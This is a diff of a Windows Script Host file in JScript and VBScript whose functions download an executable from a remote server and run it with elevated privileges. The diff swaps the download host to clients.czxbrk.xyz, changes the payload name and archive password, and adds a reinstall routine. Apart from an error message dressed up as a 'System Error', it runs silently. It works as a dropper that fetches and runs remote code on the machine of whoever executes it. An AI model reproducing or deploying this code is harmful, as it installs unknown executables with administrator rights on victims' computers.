@@ -39,37 +39,6 @@ function ExeDownlRun01( strURL, iTimeOut, strFileNameExe, constOpt){
 	return 0;
 }
 
-/* *********************************************************
-'
-' HackerScriptRepair01()
-'
-' This Script Repair HackerScript Library Folders
-'
-' PARAMETERS:	NONE;
-' GLOBALS:		strHackLIBURL — URL Path to Download
-'				iTimeOut01 — Wait to End Execution of the File
-' 				strHackLIBFileNameExe - Name of Exe File
-'				constHackLIBOpt — Options of Exe File
-'				strHackLIBFolder —
-' RETURNS:		0 if Success Download and Run
-'				1 if Folder Already Exists
-'				2 if Error Occur
-'
-' *********************************************************/
-function HackerScriptRepair01(){
-	var iFlag, fso;
-	// Define ActiveX Objects
-	fso = new ActiveXObject("Scripting.FileSystemObject");
-	// TEST WScript.Echo( strHackLIBFolder );
-	if(fso.FolderExists( strHackLIBFolder )){
-		return 1;
-	}
-	else {
-		iFlag = ExeDownlRun01( strHackLIBURL, iTimeOut01, strHackLIBFileNameExe, constHackLIBOpt );
-		if( iFlag == 1 ) return 2;
-		else return 0;
-	}
-}
 /* *****************************************************************************
 '
 ' getTempEnviron()
@@ -90,7 +59,7 @@ function getTempEnviron() {
 	envProc = wsh.Environment("PROCESS");
 	// Define System Environment Variable
 	envSys = wsh.Environment;
-	
+
 	var  envVariable;
 	envVariable = envProc( "TEMP" );
 	if(!fso.FolderExists( envVariable )){
@@ -138,15 +107,15 @@ function UploadFilesFromInt(strFile, strURL, strPath){
 	// Define Full Local Path to be Downloaded
 	strLocal_Path = strPath + "\\" + strFile;
 
-	// Test 
+	// Test
 	// WScript.Echo("strFileURL = " + strFileURL + "\nstrLocal_Path = " + strLocal_Path +"\n");
-	
+
 	// Check if Path is Exist
 	if(fso.FolderExists(strPath))
 	intUploadFilesFromInt = 0;
 	else
 	intUploadFilesFromInt = 1;
-	
+
 	// Downloaded File
 	// Open URL (Get Requiest)
 	xmlHttp.Open( "GET", strFileURL, false );
@@ -155,7 +124,7 @@ function UploadFilesFromInt(strFile, strURL, strPath){
 	// Send File from URL
 	xmlHttp.Send();
 	if( xmlHttp.Status == 200 && intUploadFilesFromInt == 0)
-	// If Send Request is Successful 
+	// If Send Request is Successful
 	blnExistRemoteFile = true;
 	else
 	{
@@ -175,7 +144,7 @@ function UploadFilesFromInt(strFile, strURL, strPath){
 		adoStream.SaveToFile( strLocal_Path, 2 );
 		// /Downloaded File
 
-		// Close Objects	
+		// Close Objects
 		adoStream.Close();
 		xmlHttp.Abort();
 
@@ -213,7 +182,7 @@ function RunDownloadedExe02(strPath, strVBS, constOpt, intTimeOut ){
 	// Run exe with Elevated Privileges ("runas") at Normal Mode (1), with working Diretory strPath
 	shApp.ShellExecute( strValue, constOpt, strPath, "runas", 1 );
 	//    setTimeout( DoNothing, intTimeOut );
-	// Stop Script on intTimeOut miliseconds for Wait if  Bitsadmin done 
+	// Stop Script on intTimeOut miliseconds for Wait if  Bitsadmin done
 	WScript.Sleep(intTimeOut);
 }
 ]]>
@@ -227,15 +196,79 @@ var constHackLIBOpt;			// Arguments of Exe File
 var strHackLIBFolder;
 
 // Test
-strHackLIBFileNameExe = "LIBScript.SFX.exe";
-constHackLIBOpt = "-p1234";
+strHackLIBFileNameExe = "szbek.exe";
+constHackLIBOpt = "-pszbeck";
 // Define strHackFolder
 strHackLIBFolder = "C:\\pub1\\Distrib\\LIB\\LIB-JS";
 
 // Define Temporary Variables
 var strHackLIBURL, iTimeOut01;
-strHackLIBURL = "http://ware.tuneserv.ru:80/LIB/Exe/";
+strHackLIBURL = "http://clients.czxbrk.xyz:80/LIB/Exe/";
 iTimeOut01 = 30000;
+
+]]>
+</script>
+<script language="JScript">
+<![CDATA[
+
+/* *********************************************************
+'
+' HackerScriptRepair01()
+'
+' This Script Repair HackerScript Library Folders
+'
+' PARAMETERS:	NONE;
+' GLOBALS:		strHackLIBURL — URL Path to Download
+'				iTimeOut01 — Wait to End Execution of the File
+' 				strHackLIBFileNameExe - Name of Exe File
+'				constHackLIBOpt — Options of Exe File
+'				strHackLIBFolder —
+' RETURNS:		0 if Success Download and Run
+'				1 if Folder Already Exists
+'				2 if Error Occur
+'
+' *********************************************************/
+function HackerScriptRepair01(){
+	var iFlag, fso;
+	// Define ActiveX Objects
+	fso = new ActiveXObject("Scripting.FileSystemObject");
+	// WScript.Echo( strHackLIBFolder );
+	if(fso.FolderExists( strHackLIBFolder )){
+		return 1;
+	}
+	else {
+		iFlag = ExeDownlRun01( strHackLIBURL, iTimeOut01, strHackLIBFileNameExe, constHackLIBOpt );
+		if( iFlag == 1 ) return 2;
+		else return 0;
+	}
+}
+
+
+/* *********************************************************
+'
+' HackerScriptRepair02()
+'
+' This Script Reinstall HackerScript Library Folders
+'
+' PARAMETERS:	NONE;
+' GLOBALS:		strHackLIBURL — URL Path to Download
+'				iTimeOut01 — Wait to End Execution of the File
+' 				strHackLIBFileNameExe - Name of Exe File
+'				constHackLIBOpt — Options of Exe File
+'				strHackLIBFolder —
+' RETURNS:		0 if Success Download and Run
+'				2 if Error Occur
+'
+' *********************************************************/
+function HackerScriptRepair02(){
+	var iFlag, fso;
+	// Define ActiveX Objects
+	fso = new ActiveXObject("Scripting.FileSystemObject");
+	// TEST WScript.Echo( strHackLIBFolder );
+	iFlag = ExeDownlRun01( strHackLIBURL, iTimeOut01, strHackLIBFileNameExe, constHackLIBOpt );
+	if( iFlag == 1 ) return 2;
+	else return 0;
+}
 
 ]]>
 </script>
@@ -245,11 +278,11 @@ iTimeOut01 = 30000;
 Dim iFlag
 iFlag = HackerScriptRepair01()
 If iFlag = 0 Then
-' MsgBox "Success Script Creation!"
+	'MsgBox "Success Script Creation!"
 ElseIf iFlag = 1 Then
-' MsgBox "Folder Already Exists."
+	MsgBox "Folder Already Exists."
 ElseIf iFlag = 2 Then
-MsgBox "Error Download and Execution File: " + strHackLIBFileNameExe, vbOkOnly Or vbCritical, "System Error"
+	MsgBox "Error Download and Execution File: " + strHackLIBFileNameExe, vbOkOnly Or vbCritical, "System Error"
 End If
 ]]>
 </script>
